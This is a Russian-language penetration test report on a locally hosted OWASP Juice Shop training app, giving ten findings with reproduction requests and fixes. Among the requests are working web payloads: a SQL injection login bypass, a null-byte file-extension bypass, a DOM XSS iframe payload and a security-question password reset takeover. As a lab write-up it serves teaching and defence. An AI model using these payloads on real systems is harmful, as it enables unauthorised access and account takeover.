# OWASP Juice Shop Security Assessment

## Общая информация

**Объект тестирования:** OWASP Juice Shop  
**Среда:** Kali Linux  
**URL:** `http://127.0.0.1:3000`  
**Метод:** ручное тестирование web/API через браузер и Burp Suite  

## Область тестирования

В рамках работы тестировалось локально развёрнутое приложение OWASP Juice Shop. Проверка выполнялась только в учебной лабораторной среде. Целью было выявить и задокументировать уязвимости в логике аутентификации, контроле доступа, обработке пользовательского ввода, публикации файлов, обработке ошибок и конфигурации API.

Вне области тестирования:

- атаки на сторонние сервисы;
- эксплуатация публичных интернет-ресурсов;
- DoS/DDoS;
- атаки за пределами локального стенда.

## Использованные инструменты

| Инструмент | Назначение |
|---|---|
| Burp Suite | перехват, анализ и повтор запросов |
| Firefox | взаимодействие с приложением |
| Docker / Kali Linux | локальный запуск стенда |
| Browser DevTools / Burp Decoder | анализ токенов и клиентского поведения |

## Краткое резюме

В ходе тестирования было выявлено 10 уязвимостей различной критичности. Наиболее серьёзные проблемы позволяют обойти аутентификацию администратора, получить доступ к административной панели, захватить пользовательский аккаунт через слабый механизм восстановления пароля и выполнить JavaScript-код в браузере пользователя.

Основной риск заключается не в одной отдельной ошибке, а в совокупности проблем: слабая аутентификация, избыточное раскрытие данных, небезопасная обработка файлов, подробные ошибки сервера и недостаточная изоляция чувствительных API.

# Finding 01

## Title

SQL Injection: обход аутентификации администратора

## Severity

Critical

## Description

Endpoint `POST /rest/user/login`, отвечающий за вход пользователя, уязвим к SQL Injection. Значение поля `email`, передаваемое пользователем, небезопасно обрабатывается серверной логикой аутентификации. Это позволяет изменить условие SQL-запроса и обойти проверку пароля.

В результате неавторизованный пользователь может получить валидный JWT-токен административной учётной записи `admin@juice-sh.op`.

## Steps to Reproduce

1. Открыть страницу входа в приложение.
2. В Burp Suite перехватить запрос к endpoint-у:

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"email":"test@test.com","password":"test123"}
```

3. Убедиться, что при обычных неверных данных сервер возвращает ошибку:

```http
HTTP/1.1 401 Unauthorized

Invalid email or password.
```

4. Отправить изменённый запрос:

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":"test123"}
```

5. Проверить ответ сервера:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

6. В ответе присутствует authentication token и email администратора:

```json
{
  "authentication": {
    "token": "[REDACTED]",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

## Impact

Уязвимость позволяет полностью обойти механизм аутентификации и получить доступ к административной учётной записи без знания пароля. Это может привести к компрометации административной панели, просмотру пользовательских данных и дальнейшей эксплуатации других уязвимостей приложения.

## Remediation

- Использовать параметризованные SQL-запросы или безопасные ORM-методы.
- Исключить конкатенацию пользовательского ввода при построении SQL-запросов.
- Добавить серверную валидацию входных данных.
- Логировать подозрительные попытки входа.
- Добавить автоматические security-тесты для проверки login endpoint на SQL Injection.

# Finding 02

## Title

Доступ к административной панели после обхода аутентификации

## Severity

High

## Description

После успешной эксплуатации SQL Injection в механизме входа был получен JWT-токен администратора. Используя этот токен, удалось открыть административный раздел приложения `/#/administration` и получить доступ к API, возвращающим административные данные.

В ответах сервера были получены данные пользователей, роли, статусы активности и feedback-записи.

## Steps to Reproduce

1. Выполнить обход аутентификации через SQL Injection из Finding 01.
2. Получить административную сессию для `admin@juice-sh.op`.
3. Открыть административный маршрут:

```text
http://127.0.0.1:3000/#/administration
```

4. В Burp Suite зафиксировать административные API-запросы, например к списку пользователей.
5. Убедиться, что сервер возвращает успешный ответ:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

6. В ответе присутствуют административные данные:

```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "email": "admin@juice-sh.op",
      "password": "********************************",
      "role": "admin",
      "isActive": true
    },
    {
      "id": 2,
      "email": "jim@juice-sh.op",
      "password": "********************************",
      "role": "customer",
      "isActive": true
    }
  ]
}
```

## Impact

Атакующий, получивший административный токен, может получить доступ к привилегированным функциям приложения. Это позволяет просматривать пользовательские данные, анализировать внутренние сущности приложения и использовать административные API для дальнейшей эксплуатации.

## Remediation

- Устранить SQL Injection в механизме аутентификации.
- Проверять права доступа на серверной стороне для каждого административного API.
- Не полагаться только на скрытие административных маршрутов во frontend.
- Ограничить объём данных, возвращаемых административными endpoint-ами.
- Добавить аудит обращений к административным API.

# Finding 03

## Title

Раскрытие внутренней технической информации через подробные ошибки сервера

## Severity

Medium

## Description

Приложение возвращает пользователю подробные технические ошибки сервера, включая stack trace, внутренние пути файлов, используемые библиотеки, ORM и SQL-запросы. Это было подтверждено при повторном добавлении уже существующего товара в корзину, а также при обращении к запрещённому файлу в `/ftp`.

Такая информация помогает атакующему понять внутреннюю архитектуру backend-а и подобрать дальнейшие техники эксплуатации.

## Steps to Reproduce

1. Авторизоваться в приложении обычным пользователем.
2. Добавить товар в корзину.
3. Повторно отправить тот же запрос добавления товара:

```http
POST /api/BasketItems/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer [REDACTED]

{"ProductId":6,"BasketId":"6","quantity":1}
```

4. Получить ответ сервера:

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
```

5. В теле ответа отображаются внутренние детали:

```text
SequelizeUniqueConstraintError
/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js
/juice-shop/build/routes/basketItems.js:67:41
SQLITE_CONSTRAINT
INSERT INTO `BasketItems`
```

6. Дополнительно при обращении к запрещённому backup-файлу сервер возвращает stack trace:

```text
OWASP Juice Shop (Express ^4.22.1)
at verify (/juice-shop/build/routes/fileServer.js:59:18)
at /juice-shop/build/routes/fileServer.js:43:13
/juice-shop/node_modules/express/lib/router/layer.js
```

## Impact

Подробные ошибки раскрывают внутреннюю структуру приложения, используемые framework-и, пути файлов, ORM, SQL-запросы и версии компонентов. Это снижает сложность дальнейшей атаки и помогает атакующему строить более точную эксплуатационную цепочку.

## Remediation

- Отключить вывод stack trace в production-режиме.
- Возвращать пользователю только обобщённые сообщения об ошибке.
- Логировать подробные ошибки только на сервере.
- Настроить централизованный error handling.
- Проверить, что переменные окружения и конфигурация приложения не включают debug-режим в production.

# Finding 04

## Title

Открытый directory listing и раскрытие служебных файлов

## Severity

Medium

## Description

Директория `/ftp` доступна без аутентификации и возвращает HTML-страницу со списком файлов. В листинге раскрываются названия внутренних и служебных файлов, включая backup-файлы, markdown-документы, `.pyc`, `.kdbx` и `.yml` артефакты.

Дополнительно был открыт файл `acquisitions.md`, содержащий пометку о конфиденциальности.

## Steps to Reproduce

1. Открыть в браузере:

```text
http://127.0.0.1:3000/ftp
```

2. Убедиться, что сервер возвращает directory listing:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
```

3. В HTML-ответе присутствует заголовок:

```html
<title>listing directory /ftp</title>
```

4. В листинге отображаются файлы:

```text
acquisitions.md
announcement_encrypted.md
coupons_2013.md.bak
encrypt.pyc
incident-support.kdbx
package-lock.json.bak
package.json.bak
suspicious_errors.yml
```

5. Открыть файл:

```text
http://127.0.0.1:3000/ftp/acquisitions.md
```

6. Сервер возвращает содержимое документа:

```http
HTTP/1.1 200 OK
Content-Type: text/markdown; charset=UTF-8
```

7. В файле присутствует фраза:

```text
This document is confidential! Do not distribute!
```

## Impact

Открытый directory listing раскрывает внутреннюю структуру файлов и может привести к утечке чувствительной информации. Даже если часть файлов не открывается напрямую, сами имена файлов помогают атакующему понять структуру приложения и выбрать дальнейшие цели.

## Remediation

- Отключить directory listing на уровне web-сервера или backend-framework.
- Удалить служебные и backup-файлы из публичной директории.
- Разделить публичные и внутренние файлы.
- Добавить контроль доступа к директориям, которые не должны быть публичными.
- Проверять pipeline деплоя на случайную публикацию `.bak`, `.pyc`, `.kdbx`, `.yml` и других служебных файлов.

# Finding 05

## Title

Обход ограничения расширений и чтение backup-файла

## Severity

Medium

## Description

Приложение блокирует прямое обращение к backup-файлу `package.json.bak`, возвращая ошибку о том, что разрешены только `.md` и `.pdf` файлы. Однако проверку расширения удалось обойти с помощью модифицированного URL с encoded null byte и разрешённым расширением `.md`.

В результате сервер вернул содержимое backup-файла `package.json.bak`, включая зависимости, версии библиотек, scripts и сведения о проекте.

## Steps to Reproduce

1. Открыть файл напрямую:

```text
http://127.0.0.1:3000/ftp/package.json.bak
```

2. Сервер блокирует запрос:

```http
HTTP/1.1 403 Forbidden
```

3. В ответе отображается сообщение:

```text
Error: Only .md and .pdf files are allowed!
```

4. Изменить URL:

```text
http://127.0.0.1:3000/ftp/package.json.bak%2500.md
```

5. Сервер возвращает файл:

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 4263
```

6. В ответе раскрываются зависимости:

```json
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "dependencies": {
    "express": "~4.16",
    "express-jwt": "0.1.3",
    "jsonwebtoken": "~8",
    "sequelize": "~4",
    "sqlite3": "~3.1.13",
    "serve-index": "~1.9"
  }
}
```

## Impact

Раскрытие `package.json.bak` позволяет атакующему получить список зависимостей и версий библиотек. Это облегчает поиск известных уязвимостей в используемых компонентах и помогает строить дальнейшую цепочку атаки.

## Remediation

- Удалить backup-файлы из публично доступных директорий.
- Запретить публикацию `.bak`, `.old`, `.backup`, `.pyc`, `.yml`, `.kdbx` и других служебных форматов.
- Выполнять проверку расширений после полной нормализации и декодирования URL.
- Добавить тесты на обходы через URL encoding, double encoding и специальные символы.
- Отключить directory listing.

# Finding 06

## Title

DOM-based XSS в поиске товаров

## Severity

Medium

## Description

Поле поиска товаров уязвимо к DOM-based Cross-Site Scripting. Введённое пользователем значение небезопасно обрабатывается frontend-логикой и вставляется в DOM, что позволяет выполнить JavaScript-код в контексте приложения.

В ходе тестирования был выполнен JavaScript `alert` с текстом `xss`.

## Steps to Reproduce

1. Открыть главную страницу приложения:

```text
http://127.0.0.1:3000
```

2. Ввести в поле поиска payload:

```html
<iframe src="javascript:alert(`xss`)">
```

3. Нажать Enter.
4. Убедиться, что браузер показывает alert:

```text
xss
```

5. В Burp Suite зафиксировать связанный search request:

```http
GET /rest/products/search?q= HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer [REDACTED]
```

Payload не отображается полностью в backend-запросе, так как уязвимость проявляется на стороне клиента и относится к DOM-based XSS.

## Impact

DOM-based XSS позволяет выполнять JavaScript в контексте приложения. В реальном приложении это может привести к краже токенов, действиям от имени пользователя, фишингу внутри доверенного домена, подмене интерфейса или атаке на администратора.

## Remediation

- Не вставлять пользовательский ввод в DOM через небезопасные методы.
- Использовать HTML-экранирование перед отображением данных.
- Ограничить использование `innerHTML` и аналогичных операций.
- Использовать безопасную sanitization-библиотеку.
- Настроить строгую Content Security Policy.
- Добавить frontend security-тесты на DOM XSS.

# Finding 07

## Title

Захват аккаунта через слабый механизм восстановления пароля

## Severity

High

## Description

Механизм восстановления пароля позволяет получить security question для указанного email без аутентификации. Если ответ на вопрос известен или угадываем, атакующий может установить новый пароль и войти в аккаунт пользователя.

Для пользователя `jim@juice-sh.op` был получен security question, после чего пароль был успешно изменён. Затем вход в аккаунт с новым паролем прошёл успешно.

## Steps to Reproduce

1. Открыть страницу восстановления пароля:

```text
http://127.0.0.1:3000/#/forgot-password
```

2. Ввести email:

```text
jim@juice-sh.op
```

3. Зафиксировать запрос:

```http
GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1
Host: 127.0.0.1:3000
```

4. Сервер возвращает вопрос:

```json
{
  "question": {
    "id": 1,
    "question": "Your eldest siblings middle name?"
  }
}
```

5. Отправить reset request:

```http
POST /rest/user/reset-password HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "jim@juice-sh.op",
  "answer": "Samuel",
  "new": "[REDACTED]",
  "repeat": "[REDACTED]"
}
```

6. Сервер возвращает успешный ответ:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

7. После этого выполнить вход под `jim@juice-sh.op` с новым паролем.
8. Сервер возвращает authentication token:

```json
{
  "authentication": {
    "token": "[REDACTED]",
    "bid": 2,
    "umail": "jim@juice-sh.op"
  }
}
```

## Impact

Уязвимость позволяет захватить пользовательский аккаунт без знания старого пароля. Атакующий может получить доступ к данным пользователя, истории заказов, корзине, адресам и другим функциям аккаунта.

Риск усиливается тем, что security question раскрывается без аутентификации, а ответ на него может быть найден в открытых источниках или угадан.

## Remediation

- Не использовать security questions как единственный фактор восстановления пароля.
- Использовать одноразовые reset-токены с ограниченным сроком действия.
- Отправлять reset-ссылку только на подтверждённый email пользователя.
- Ограничить количество попыток ответа.
- Добавить rate limiting и временную блокировку после нескольких неудачных попыток.
- Не возвращать поле `password` или password hash в API-ответах.
- Уведомлять пользователя о смене пароля.

# Finding 08

## Title

JWT содержит чувствительные данные пользователя

## Severity

Medium

## Description

JWT-токен, возвращаемый после успешной аутентификации, содержит избыточные данные пользователя в payload. После декодирования payload были обнаружены email, роль пользователя, статус активности, служебные поля и password hash.

JWT payload не является зашифрованным: он только base64url-encoded. Любой пользователь, получивший токен, может декодировать его и увидеть содержимое.

## Steps to Reproduce

1. Выполнить успешный вход в приложение.
2. Получить login response:

```json
{
  "authentication": {
    "token": "[REDACTED]",
    "bid": 2,
    "umail": "jim@juice-sh.op"
  }
}
```

3. Скопировать JWT-токен.
4. Разделить токен на три части:

```text
header.payload.signature
```

5. Декодировать среднюю часть payload через Burp Decoder как Base64 URL.
6. Получить JSON payload:

```json
{
  "status": "success",
  "data": {
    "id": 2,
    "username": "",
    "email": "jim@juice-sh.op",
    "password": "[HASH_REDACTED]",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "",
    "profileImage": "assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true
  },
  "iat": 1781173632
}
```

## Impact

Хранение чувствительных данных в JWT увеличивает риск раскрытия информации. Если токен попадёт к третьей стороне, она сможет декодировать payload и получить email, роль, внутренние поля профиля и password hash.

Даже если hash не является plaintext-паролем, его раскрытие не должно происходить через клиентский токен.

## Remediation

- Не помещать чувствительные данные в JWT payload.
- Хранить в токене только минимальный набор claims, например `sub`, `role`, `iat`, `exp`.
- Не включать password hash, TOTP-поля, служебные данные и внутренние timestamps.
- Использовать короткий срок жизни access token.
- Рассмотреть refresh-token flow.
- Проводить security review структуры токенов.

# Finding 09

## Title

User Enumeration через механизм восстановления пароля

## Severity

Low / Medium

## Description

Endpoint `GET /rest/user/security-question` позволяет определить, существует ли пользователь с указанным email. Для существующего email сервер возвращает security question, а для несуществующего — пустой объект. Хотя HTTP status в обоих случаях равен `200 OK`, различие в теле ответа позволяет проводить user enumeration.

## Steps to Reproduce

1. Отправить запрос для существующего пользователя:

```http
GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1
Host: 127.0.0.1:3000
```

2. Получить ответ:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

```json
{
  "question": {
    "id": 1,
    "question": "Your eldest siblings middle name?"
  }
}
```

3. Отправить запрос для несуществующего пользователя:

```http
GET /rest/user/security-question?email=notrealuser12345@test.com HTTP/1.1
Host: 127.0.0.1:3000
```

4. Получить ответ:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
```

```json
{}
```

5. Сравнить ответы. Различие позволяет определить, какие email существуют в системе.

## Impact

User Enumeration позволяет атакующему собирать список валидных пользователей. Это может использоваться для последующих атак: password reset abuse, credential stuffing, phishing, brute force или targeted social engineering.

В связке с Finding 07 эта проблема становится более серьёзной, так как подтверждённый email можно сразу использовать для попытки захвата аккаунта через восстановление пароля.

## Remediation

- Возвращать одинаковый ответ для существующих и несуществующих email.
- Не раскрывать security question до прохождения дополнительной проверки.
- Использовать email-based reset flow с одноразовыми токенами.
- Добавить rate limiting на password reset endpoints.
- Логировать массовые попытки перебора email.

# Finding 10

## Title

Небезопасная CORS-конфигурация

## Severity

Low / Medium

## Description

Приложение возвращает заголовок:

```http
Access-Control-Allow-Origin: *
```

даже при запросах с произвольного Origin, например `http://evil.example`. Такая конфигурация разрешает чтение ответов API из любого источника. Для публичных endpoint-ов это не всегда критично, но в приложении с чувствительными API, login flow, password reset и административными endpoint-ами wildcard CORS является небезопасной настройкой.

## Steps to Reproduce

1. В Burp Repeater взять запрос к чувствительному endpoint-у:

```http
GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1
Host: 127.0.0.1:3000
```

2. Добавить header:

```http
Origin: http://evil.example
```

3. Отправить запрос:

```http
GET /rest/user/security-question?email=jim@juice-sh.op HTTP/1.1
Host: 127.0.0.1:3000
Origin: http://evil.example
```

4. Проверить response headers:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
```

## Impact

Wildcard CORS может увеличить риск эксплуатации клиентских атак и утечки данных через браузерные сценарии, особенно если приложение в будущем начнёт использовать cookie-based authentication или разрешит credentialed requests.

В текущей цепочке атаки эта проблема усиливает общий риск, так как API уже раскрывает чувствительные данные и используется в механизмах восстановления пароля.

## Remediation

- Не использовать `Access-Control-Allow-Origin: *` для чувствительных API.
- Разрешать только доверенные origin-ы.
- Разделить публичные и приватные API по CORS-политикам.
- Не включать CORS глобально для всего приложения.
- Проверять CORS-конфигурацию в рамках security testing.
- Добавить automated tests на недоверенные Origin.

# Реконструкция общей цепочки атаки

Обнаруженные уязвимости могут быть объединены в реалистичную цепочку атаки:

1. Атакующий проводит разведку приложения через Burp Suite и находит endpoint-ы API.
2. Через SQL Injection в `POST /rest/user/login` атакующий получает административный JWT.
3. С административной сессией открывается раздел `/#/administration`, где раскрываются пользователи и другие административные данные.
4. Через `/ftp` атакующий получает список служебных файлов.
5. Через обход ограничения расширений атакующий скачивает `package.json.bak` и получает список зависимостей backend-а.
6. Подробные ошибки сервера раскрывают framework, внутренние пути и SQL/ORM детали.
7. DOM-based XSS даёт возможность выполнить JavaScript в контексте приложения.
8. Механизм восстановления пароля раскрывает security question для пользователя.
9. При знании ответа атакующий сбрасывает пароль и захватывает аккаунт.
10. JWT payload дополнительно раскрывает чувствительные данные, включая password hash.

Эта цепочка показывает, что ключевая проблема заключается не в одном изолированном баге, а в комбинации слабой аутентификации, недостаточного контроля доступа, небезопасной обработки пользовательского ввода, избыточного раскрытия данных и слабой конфигурации API.

# Общие рекомендации

1. Исправить SQL Injection в механизме аутентификации.
2. Внедрить строгую server-side authorization проверку для всех административных API.
3. Удалить служебные и backup-файлы из публичных директорий.
4. Отключить directory listing.
5. Нормализовать и декодировать пути файлов до проверки расширений.
6. Отключить stack trace и подробные ошибки в production.
7. Переработать механизм восстановления пароля на reset-токены.
8. Исключить password hash и другие чувствительные поля из JWT payload и API-ответов.
9. Исправить DOM XSS через безопасное отображение пользовательского ввода.
10. Ограничить CORS только доверенными origin-ами.
11. Добавить rate limiting и security logging для login/password reset endpoints.
12. Добавить автоматические security-тесты в CI/CD.
13. Проводить регулярный dependency audit.
14. Добавить мониторинг подозрительных действий: массовые login attempts, password reset attempts, обращения к служебным директориям и административным API.
